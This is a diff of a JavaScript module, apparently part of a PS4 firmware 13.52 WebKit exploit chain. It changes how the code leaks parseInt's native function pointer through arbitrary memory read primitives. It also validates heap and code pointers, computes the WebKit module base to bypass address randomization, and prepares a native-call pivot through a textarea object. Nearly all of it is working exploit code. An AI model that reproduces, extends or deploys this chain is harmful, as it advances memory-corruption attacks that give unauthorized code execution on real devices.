@@ -1,6 +1,6 @@
 /**
  * PS4 13.52 native call — parseInt + carrier textarea (slopkit-core anchors).
- * Live re-scan fallback — does not rely on core.js module singleton (cache-safe).
+ * Prefer carrier.native @ READ-PRIMITIVE-PASS; live scan is fallback only.
  */
 import { int64 } from "./int64.js";
 import {
@@ -13,20 +13,45 @@ const M_FUNCTION_OFF = 0x28;
 const JSFUNC_EXECUTABLE_OFF = 0x18;
 const CORE_NATIVE_SS = "wk-core-native";
 
-/** JSC heap cell — same rules as mem.leakval / core.plausibleCell (0x2… is valid). */
+function ptrBig(p) {
+    return (BigInt(p.hi >>> 0) << 32n) | BigInt(p.low >>> 0);
+}
+
+/** core.plausibleAddress — code or heap pointer, not hi>=0x80. */
+function plausibleAddress64(p) {
+    if (!p) return false;
+    const v = ptrBig(p);
+    return v > 0x100000000n && v <= 0xffffffffffffn;
+}
+
+/** JSC heap cell — mem.leakval / core.plausibleCell (0x2… valid). */
 function plausibleCell64(p) {
     if (!p) return false;
     if (p.hi > 0xffff) return false;
     if (p.low === 0 && p.hi === 0) return false;
     if ((p.low & 7) !== 0) return false;
-    const v = (BigInt(p.hi >>> 0) << 32n) | BigInt(p.low >>> 0);
-    return v > 0x100000000n && v <= 0xffffffffffffn;
+    return plausibleAddress64(p);
 }
 
-/** Mapped code pointer (webkit / libkernel — 0x8… range). */
-function plausibleCode64(p) {
-    if (!plausibleCell64(p)) return false;
-    return p.hi >= 0x80 && p.hi <= 0x8f;
+function codeLooksNative(code4) {
+    return code4 != null && code4 !== 0 && code4 !== 0xffffffff && code4 !== 0xcccccccc;
+}
+
+function plausibleNativeFn64(p, ptr, read4) {
+    if (!plausibleAddress64(ptr)) return false;
+    if (ptr.hi >= 0x80 && ptr.hi <= 0x8f) return true;
+    if (p && read4) {
+        try {
+            const q = read4(p, ptr);
+            if (codeLooksNative(q)) return true;
+        } catch (_) { }
+    }
+    return ptr.hi >= 0x8;
+}
+
+function plausibleModuleBase(p) {
+    if (!plausibleAddress64(p)) return false;
+    return p.hi >= 0x80 && p.hi <= 0x8f && (p.low & 0x3fff) === 0;
 }
 
 function numToI64(n) {
@@ -44,6 +69,16 @@ function numToI64(n) {
     }
     if (!Number.isFinite(n) || n <= 0) return null;
     return new int64(n >>> 0, Math.floor(n / 0x100000000) >>> 0);
+}
+
+function read4p(p, addr) {
+    try {
+        const v = p.read4(addr);
+        if (v == null) return null;
+        return (v.low >>> 0) | ((v.hi >>> 0) * 0x100000000);
+    } catch (_) {
+        return null;
+    }
 }
 
 function loadStoredNative() {
@@ -77,17 +112,45 @@ function nativeFromCarrier(carrier) {
         if (exec && tc)
             return Object.assign({ _src: "carrier.native" }, carrier.native);
     }
-    if (Number.isFinite(carrier.textareaAddress) && carrier.textareaAddress > 0) {
-        return {
-            target: parseInt,
-            textareaCell: carrier.textareaAddress,
-            _src: "carrier.textareaAddress",
-        };
-    }
     return loadStoredNative();
 }
 
-/** Walk parseInt JSFunction → NativeExecutable+0x28 @ PRIMITIVE-OK (same as core validation). */
+function capFromAnchors(p, carrier, nat, read4) {
+    const exec = numToI64(nat.executable);
+    const targetCell = numToI64(nat.targetCell);
+    if (!exec || !targetCell) return null;
+
+    const textarea = carrier && carrier.textarea;
+    if (!textarea) return null;
+
+    const mainMf = exec.add32(M_FUNCTION_OFF);
+    let mainOrig = numToI64(nat.nativeFn);
+    if (!mainOrig || !plausibleNativeFn64(p, mainOrig, read4)) {
+        try { mainOrig = p.read8(mainMf); } catch (_) { return null; }
+    }
+    if (!plausibleNativeFn64(p, mainOrig, read4)) return null;
+
+    let pivotCell;
+    try { pivotCell = p.leakval(textarea); } catch (_) {
+        pivotCell = numToI64(nat.textareaCell || carrier.textareaAddress);
+        if (!pivotCell) return null;
+    }
+
+    return {
+        mainMf,
+        mainOrig,
+        nativeFn: mainOrig,
+        pivotTrigger: parseInt,
+        pivotBuiltinName: "parseint-" + (nat._src || "carrier"),
+        path: "anchors-" + (nat._src || "carrier"),
+        cell: targetCell,
+        pivotObj: textarea,
+        pivotCell,
+        textarea,
+    };
+}
+
+/** Live walk — only if carrier.native missing. */
 export function captureParseIntLive(p, carrier) {
     if (!p || typeof p.leakval !== "function")
         return { err: "no-p" };
@@ -114,7 +177,7 @@ export function captureParseIntLive(p, carrier) {
     try { mainOrig = p.read8(mainMf); } catch (e) {
         return { err: "read m_function: " + (e && e.message ? e.message : e) };
     }
-    if (!plausibleCode64(mainOrig))
+    if (!plausibleNativeFn64(p, mainOrig, read4p))
         return { err: "bad-native-fn=" + mainOrig + "@+" + M_FUNCTION_OFF.toString(16) };
 
     let pivotCell;
@@ -141,41 +204,26 @@ export function captureParseIntLive(p, carrier) {
 }
 
 export function captureFromCarrier(p, carrier, off) {
+    const nat = nativeFromCarrier(carrier);
+    if (nat) {
+        const anchored = capFromAnchors(p, carrier, nat, read4p);
+        if (anchored) return anchored;
+    }
+
     const live = captureParseIntLive(p, carrier);
     if (live.cap) return live.cap;
 
-    const nat = nativeFromCarrier(carrier);
-    if (!nat) return null;
+    return null;
+}
 
-    const exec = numToI64(nat.executable);
-    const targetCell = numToI64(nat.targetCell);
-    if (!exec || !targetCell) {
+function loadSessionWebkitBase() {
+    try {
+        const raw = sessionStorage.getItem("wk-webkitBase");
+        if (!raw) return null;
+        return numToI64(String(raw).replace(/^0x/i, ""));
+    } catch (_) {
         return null;
     }
-
-    const mainMf = exec.add32(M_FUNCTION_OFF);
-    let mainOrig;
-    try { mainOrig = p.read8(mainMf); } catch (_) { return null; }
-    if (!plausibleCode64(mainOrig)) return null;
-
-    let pivotObj = carrier && carrier.textarea || null;
-    let pivotCell = numToI64(nat.textareaCell);
-    if (pivotObj) {
-        try { pivotCell = p.leakval(pivotObj); } catch (_) { }
-    }
-
-    return {
-        mainMf,
-        mainOrig,
-        nativeFn: mainOrig,
-        pivotTrigger: nat.target || parseInt,
-        pivotBuiltinName: "parseint-stored",
-        path: "stored-" + (nat._src || "?"),
-        cell: targetCell,
-        pivotObj,
-        pivotCell,
-        textarea: pivotObj,
-    };
 }
 
 export function webkitBaseFromCap(cap, off) {
@@ -183,9 +231,20 @@ export function webkitBaseFromCap(cap, off) {
     const rva = off.wk_parseint_native || off.wk_expm1_builtin;
     if (!rva) return null;
     const base = cap.nativeFn.sub32(rva);
-    if (base.hi < 0x80 || base.hi > 0x8f) return null;
-    if ((base.low & 0x3fff) !== 0) return null;
+    if (!plausibleModuleBase(base)) return null;
     return base;
+}
+
+function resolveWebkitBaseForCore(cap, off) {
+    const sess = loadSessionWebkitBase();
+    if (sess && plausibleModuleBase(sess)) return sess;
+    const fromCap = webkitBaseFromCap(cap, off);
+    if (fromCap) return fromCap;
+    if (cap && cap.nativeFn && off && off.wk_expm1_builtin) {
+        const b = cap.nativeFn.sub32(off.wk_expm1_builtin);
+        if (plausibleModuleBase(b)) return b;
+    }
+    return null;
 }
 
 export function prepCoreNative(p, off, carrier, opts) {
@@ -201,10 +260,10 @@ export function prepCoreNative(p, off, carrier, opts) {
 function finishCorePrep(p, off, carrier, cap) {
     if (!cap.pivotObj)
         throw new Error("core_native: carrier textarea missing");
-    const webkitBase = webkitBaseFromCap(cap, off);
+    const webkitBase = resolveWebkitBaseForCore(cap, off);
     if (!webkitBase)
-        throw new Error("core_native: webkit base bad (parseInt rva "
-            + (off.wk_parseint_native || 0).toString(16) + ") fn=" + cap.nativeFn);
+        throw new Error("core_native: webkit base bad fn=" + cap.nativeFn
+            + " (Start should log WEBKIT-BASE — tap Save bases)");
 
     cap.pivotTrigger = cap.pivotTrigger || parseInt;
     const prep = prepNativeChain(p, off, webkitBase, cap);
